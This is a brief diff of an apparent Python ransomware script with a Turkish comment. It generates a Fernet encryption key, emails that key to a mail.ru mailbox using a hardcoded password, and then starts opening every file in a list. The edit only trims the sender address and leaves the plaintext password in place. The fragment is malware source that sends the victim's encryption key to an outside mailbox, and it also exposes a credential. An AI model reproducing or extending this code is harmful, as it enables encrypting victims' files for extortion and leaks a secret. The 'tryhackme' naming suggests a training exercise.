@@ -26,7 +26,7 @@ key = Fernet.generate_key()
 # Fernet kullanarak yeni bir anahtar oluşturuyoruz.
 
 
-mail_sender('rastgeletryhackme@mail.ru','AWzaqhu1iqpuHDequaEd',key)
+mail_sender('@mail.ru','AWzaqhu1iqpuHDequaEd',key)
 
 for file in file_list:
 	with open(file,'rb') as the_file:
